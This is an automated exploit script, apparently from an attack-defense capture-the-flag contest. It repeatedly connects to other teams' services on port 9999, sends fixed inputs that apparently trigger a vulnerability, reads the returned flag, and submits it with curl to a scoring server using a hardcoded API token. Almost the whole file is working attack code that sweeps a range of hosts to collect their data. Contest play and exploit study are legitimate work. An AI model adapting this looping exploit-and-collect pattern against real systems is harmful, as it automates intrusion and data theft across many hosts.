import sys
from pwn import *

OUR_TEAM = 14
TEST = 0

def submit_flag(team_number, flag):
    print '%d flag: %s' % (team_number, flag)
    if TEST == 0:
        os.system('curl http://10.66.20.15/api/v1/jad/web/submit_flag/?event_id=2 -d \'flag=%s&token=hEjrar35KXJkyjt4Bl7UyvAK3szuzU8hHAntVQVDftnDQ\'' % flag)

context.timeout = 1

while True:
    for team in [range(1, 21), range(OUR_TEAM, OUR_TEAM + 1)][TEST]:
        try:
            con = remote('172.30.%d.13' % team, 9999)
            if TEST == 0 and team == OUR_TEAM:
                con.close()
                continue

            con.recvuntil('size > ')
            con.sendline('111')
            con.recvuntil('code > ')
            con.sendline('22')
            con.recvuntil('loc > ')
            con.sendline('33')
            con.recvuntil('[+] Run complete')
            flag = con.recvall(timeout=context.timeout).strip()
            con.close()
            if len(flag) > 0:
                submit_flag(team, flag)
        except Exception as e:
            print e

    sleep(5)
